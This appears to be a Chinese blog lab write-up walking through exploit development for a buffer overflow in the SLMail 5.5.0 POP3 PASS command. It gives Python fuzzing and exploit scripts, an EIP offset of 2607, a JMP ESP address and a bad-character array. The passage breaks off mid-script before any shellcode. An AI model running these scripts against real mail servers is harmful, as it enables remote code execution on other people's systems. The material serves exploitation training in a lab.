
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>缓冲区溢出实验（Smail） - Lw0F</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Lw0F,"> 
    <meta name="description" content="0x00实验环境：攻机：Kali
靶机：windows xp
软件：SLMail 5.5.0、immunity debugger 、mona.py
0x01实验思路：Step 1. 利用python,"> 
    <meta name="author" content="Lw0F"> 
    <link rel="alternative" href="atom.xml" title="Lw0F" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 5.2.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Lw0F</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://lw0f.fun"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">缓冲区溢出实验（Smail）</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">缓冲区溢出实验（Smail）</h1>
        <div class="stuff">
            <span>五月 20, 2020</span>
            

        </div>
        <div class="content markdown">
            <h2 id="0x00实验环境："><a href="#0x00实验环境：" class="headerlink" title="0x00实验环境："></a><strong><em>0x00实验环境：</em></strong></h2><p><strong><em>攻机：Kali</em></strong></p>
<p><strong><em>靶机：windows xp</em></strong></p>
<p><strong><em>软件：SLMail 5.5.0、immunity debugger 、mona.py</em></strong></p>
<h2 id="0x01实验思路："><a href="#0x01实验思路：" class="headerlink" title="0x01实验思路："></a><strong><em>0x01实验思路：</em></strong></h2><p><strong>Step 1. 利用python脚本测试连接windows的POP3</strong></p>
<p><strong><em>Step 2. 测试符合是否会发生缓冲区溢出</em></strong></p>
<p><strong><em>Step 3. 确定EIP的位置</em></strong></p>
<p><strong><em>Step 4 .验证EIP位置与ESP存放数据长度</em></strong></p>
<p><strong><em>Step 5. 查找jmp esp</em></strong></p>
<p><strong><em>Step 6. 测试跳转</em></strong></p>
<p><strong><em>Step 7. 判断坏字符</em></strong></p>
<p><strong><em>Step 8. 构造shellcode</em></strong></p>
<h2 id="0x02实验记录："><a href="#0x02实验记录：" class="headerlink" title="0x02实验记录："></a><strong><em>0x02实验记录：</em></strong></h2><h3 id="Step1-利用python脚本测试连接windows的POP3"><a href="#Step1-利用python脚本测试连接windows的POP3" class="headerlink" title="Step1.利用python脚本测试连接windows的POP3"></a><strong><em>Step1.利用python脚本测试连接windows的POP3</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>使用Python模拟正常连接</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\n Sending buffer....&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\n\r&#x27;</span>)</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;PASS LWW&#x27;</span>+<span class="string">&#x27;\n\r&#x27;</span>)</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<h3 id="Step-2-确定是否会溢出及初步EIP定位"><a href="#Step-2-确定是否会溢出及初步EIP定位" class="headerlink" title="Step 2. 确定是否会溢出及初步EIP定位"></a><strong><em>Step 2. 确定是否会溢出及初步EIP定位</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送递增的字符串，来判断是否会溢出；并通过及时输出字节长度，初步EIP定位</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = [<span class="string">&quot;A&quot;</span>]</span><br><span class="line"></span><br><span class="line">count = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer) &lt;=<span class="number">30</span>:</span><br><span class="line">	buffer.append(<span class="string">&quot;A&quot;</span>*count)</span><br><span class="line">	count +=<span class="number">200</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="keyword">for</span> strings <span class="keyword">in</span> buffer:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(strings)</span><br><span class="line">		s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">		s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;PASS&#x27;</span>+strings+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Step-3-确定EIP的位置"><a href="#Step-3-确定EIP的位置" class="headerlink" title="Step 3. 确定EIP的位置"></a><strong><em>Step 3. 确定EIP的位置</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送* *</strong>唯一字符串*** *的方法，来具体定位EIP位置**</p>
<p><strong>辅助工具：</strong></p>
<p><strong>（1）pattern_create.rb（kali里的生成唯一字符串脚本）</strong></p>
<p><strong>（2） pattern_offset.rb（kali里的计算唯一字符串具体溢出点脚本）</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、使用mmunity Debugger “attach” SLmail 服务</strong></p>


<p><strong>2、生成及发送 唯一字符串(本实验生成3000个唯一字符)</strong></p>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>3、记录EIP的显示值，并计算具体位置</strong></p>




<h3 id="Step-4-判断ESP存放数据长度"><a href="#Step-4-判断ESP存放数据长度" class="headerlink" title="Step 4 .判断ESP存放数据长度"></a><strong><em>Step 4 .判断ESP存放数据长度</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>追加发送不同的字符，来大概计算ESP容量（是否大于400，能放下一般shellcode</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、重置实验环境（重启SLmail服务+ 打开Immunity Debugger）</strong></p>
<p><strong>2、buffer中追加发送“B” 和“C” 辅助寻找</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;B&quot;</span>*<span class="number">4</span> + <span class="string">&quot;C&quot;</span>*<span class="number">800</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>3、Immunity Debugger 追踪  充满”C”的ESP</strong></p>


<p><strong>4、左下角的框框显示 出现“C”的首末地址，首末地址相减能大概估算ESP是否能存放一般shellcode（msf的一般300多字节）</strong></p>


<p><strong>5、打开windows自带计算器 （选程序员模式、十六进制模式）计算大小。</strong></p>
<p>​     <strong>如上步骤4的图显示，包含”C”的地址首末为 2FD和14D，相减得出1B1 。</strong></p>
<p>​     <strong>换算成十进制 为 433，所以ESP最少能放433字节。</strong></p>




<h3 id="Step-5-寻找JMP-ESP"><a href="#Step-5-寻找JMP-ESP" class="headerlink" title="Step 5.寻找JMP ESP"></a><strong><em>Step 5.寻找JMP ESP</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>先使用mona 寻找无内存保护等安全机制的模块，然后在合适的模块中寻找是否存在</strong></p>
<p><strong>JMP ESP，最后记录JMP ESP地址</strong></p>
<p><strong>温馨提示：</strong></p>
<p><strong>因为程序在重新打开或在不同环境打开内存地址可能会变化，为了让缓冲区溢出漏洞能多次利用，所以要在程序自带功能</strong></p>
<p><strong>模块中寻找JMP ESP，辅助溢出后精准跳转到ESP，最后植入shellcode。</strong></p>
<p><strong>辅助工具：</strong></p>
<p><strong>（1）nasm_shell.rb（汇编语言转二进制脚本，方便在mona中寻找“JMP ESP”字样）</strong></p>


<p><strong>实操记录：</strong></p>
<p><strong>1、在Immunity Debugger最下面的框输入：!mona modules</strong></p>


<p><strong>2、挑选合适的模块，需要观察参数如下：</strong></p>
<p>​    <strong>Rebase：关机后内存地址是否会变 （选False）</strong></p>
<p>​    <strong>SafeSEH：ASLR、NxCompat：都是内存保护机制  （选False ）</strong></p>
<p>   <strong>OS DLL ：系统动态链接库  （选True）</strong></p>


<p><strong>3、查询合适模块否存在JMP ESP ,并记录其地址（该实验发现SLMFC.dll 存在JMP ESP，  记录其中一个模块的 JMP ESP地址为5F4B41E3）</strong></p>



<h3 id="Step-6-测试跳转"><a href="#Step-6-测试跳转" class="headerlink" title="Step 6. 测试跳转"></a><strong><em>Step 6. 测试跳转</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>填充EIP后 发送 JMP ESP地址，观察是否跳转成功</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、将原JMP ESP地址  5F4B41E3  改写为 \xe3\x41\x4b\x5f   后发送，发现跳转成功</strong></p>
<p>​     <strong>并在ESP填了8个”C”</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;\xe3\x41\x4b\x5f&quot;</span> + <span class="string">&quot;C&quot;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>




<h3 id="Step-7-寻找坏字符"><a href="#Step-7-寻找坏字符" class="headerlink" title="Step 7. 寻找坏字符"></a><strong><em>Step 7. 寻找坏字符</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送0x00 到 0xff  256个字符，然后在 Immunity Debugger 观察哪个读取有误</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1.发送256个 hex字符</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">badchar=(</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span></span><br><span class="line"><span class="string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span>+<span class="string">&quot;B&quot;</span>*<span 